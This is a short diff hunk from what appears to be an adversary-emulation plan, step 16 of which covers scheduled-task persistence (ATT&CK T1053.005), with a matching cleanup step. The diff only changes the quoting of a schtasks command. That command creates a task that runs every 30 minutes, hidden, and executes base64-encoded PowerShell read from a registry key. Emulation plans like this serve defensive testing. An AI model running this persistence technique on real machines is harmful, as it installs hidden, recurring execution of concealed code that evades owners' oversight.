@@ -182,7 +182,7 @@ The vbs script will then:
 ### Step 16 - Persistence: T1053.005 Scheduled Task
 
 <ins>Attack procedure</ins>
-1. ```schtasks.exe /Create /F /TN "{GUID}" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz))) " /SC MINUTE /MO 30```
+1. ```schtasks.exe /Create /F /TN "{GUID}" /TR 'cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\thekey).xyz)))' /SC MINUTE /MO 30```
 
 <ins>Cleaning procedure</ins>
 1. Delete schedule task
